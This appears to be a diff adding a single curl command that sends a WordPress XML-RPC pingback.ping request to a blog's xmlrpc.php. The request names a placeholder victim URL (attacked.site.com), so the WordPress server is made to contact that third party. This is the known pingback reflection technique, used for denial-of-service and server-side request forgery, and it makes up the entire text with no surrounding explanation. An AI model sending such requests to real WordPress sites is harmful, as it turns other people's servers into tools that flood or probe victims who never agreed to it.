@@ -1,0 +1,7 @@
+curl http://www.site-wp.com/xmlrpc.php -d 
+    '<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>
+    pingback.ping</methodName><params><param><value>
+    <string>http://attacked.site.com/link_to_post
+    </string></value></param><param><value><string>
+    http://www.site-wp.com/any_blog_post/
+    </string></value></param></params></methodCall>'
